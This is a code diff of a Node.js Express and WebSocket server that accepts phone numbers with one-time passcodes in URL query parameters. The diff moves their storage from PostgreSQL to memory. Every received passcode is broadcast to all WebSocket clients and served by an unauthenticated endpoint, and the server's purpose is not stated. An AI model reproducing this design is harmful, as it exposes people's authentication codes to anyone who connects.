@@ -1,21 +1,13 @@
 const express = require('express');
-const { Pool } = require('pg');
 const path = require('path');
-const cors = require('cors');
 const { WebSocketServer } = require('ws'); // Import WebSocket library
 
 const app = express();
 
-// Enable CORS
-app.use(cors());
+// In-memory storage for OTPs
+const otpData = [];
 
-// Connect to PostgreSQL
-const pool = new Pool({
-    connectionString: process.env.DATABASE_URL,
-    ssl: { rejectUnauthorized: false },
-});
-
-// Store WebSocket clients
+// Array to store connected WebSocket clients
 const clients = [];
 
 // WebSocket server setup
@@ -24,7 +16,9 @@ wss.on('connection', (ws) => {
     console.log('New WebSocket connection');
     clients.push(ws);
 
-    // Handle WebSocket disconnection
+    // Send existing OTP data to the newly connected client
+    ws.send(JSON.stringify(otpData));
+
     ws.on('close', () => {
         console.log('WebSocket connection closed');
         const index = clients.indexOf(ws);
@@ -32,21 +26,13 @@ wss.on('connection', (ws) => {
             clients.splice(index, 1);
         }
     });
-
-    // Handle WebSocket errors
-    ws.on('error', (error) => {
-        console.error('WebSocket error:', error);
-    });
-
-    // Send welcome message
-    ws.send(JSON.stringify({ message: 'Welcome to the WebSocket server' }));
 });
 
 // Serve static HTML from 'public' folder
 app.use(express.static(path.join(__dirname, 'public')));
 
 // Endpoint to receive phone and OTP
-app.get('/', async (req, res) => {
+app.get('/', (req, res) => {
     const phone = req.query.phone;
     const otp = req.query.otp;
 
@@ -57,39 +43,22 @@ app.get('/', async (req, res) => {
         });
     }
 
-    try {
-        // Save OTP to the database
-        await pool.query('INSERT INTO otps (phone, otp) VALUES ($1, $2)', [phone, otp]);
+    // Add new OTP to in-memory data
+    otpData.push({ phone, otp });
 
-        // Notify all connected WebSocket clients
-        const message = JSON.stringify({ phone, otp });
-        clients.forEach((ws) => ws.send(message));
+    // Notify all connected WebSocket clients
+    const message = JSON.stringify({ phone, otp });
+    clients.forEach((ws) => ws.send(message));
 
-        res.status(200).json({
-            message: `OTP ${otp} received for phone ${phone}`,
-            status: 'success',
-        });
-    } catch (error) {
-        console.error('Error saving OTP:', error);
-        res.status(500).json({
-            message: 'Error saving OTP',
-            status: 'error',
-        });
-    }
+    res.status(200).json({
+        message: `OTP ${otp} received for phone ${phone}`,
+        status: 'success',
+    });
 });
 
-// Fetch all OTP data from the database
-app.get('/fetch-otp-data', async (req, res) => {
-    try {
-        const result = await pool.query('SELECT phone, otp, created_at FROM otps ORDER BY id DESC');
-        res.json(result.rows);
-    } catch (error) {
-        console.error('Error fetching OTP data:', error);
-        res.status(500).json({
-            message: 'Error fetching OTP data',
-            status: 'error',
-        });
-    }
+// Endpoint to fetch all OTP data
+app.get('/fetch-otp-data', (req, res) => {
+    res.json(otpData);
 });
 
 // Start the server and attach WebSocket
